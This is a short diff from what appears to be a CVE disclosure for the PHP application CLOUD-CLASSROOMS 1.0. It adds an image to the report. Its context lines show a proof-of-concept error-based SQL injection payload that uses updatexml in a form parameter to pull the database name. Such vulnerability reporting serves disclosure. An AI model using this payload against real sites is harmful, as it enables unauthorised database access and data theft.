@@ -182,3 +182,6 @@ CVE Request 1897846 - NO DUPLICATE
 Poc:
 - gnamex=a' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) AND '1'='1&email=test@test.com&squeryx=test&update=Post Query!
 - https://github.com/carlosalbertotuma/CLOUD-CLASSROOMS-php-1.0
+
+<img width="1332" height="691" alt="image" src="https://github.com/user-attachments/assets/86b0d582-378d-4564-8474-a31d03369345" />
+
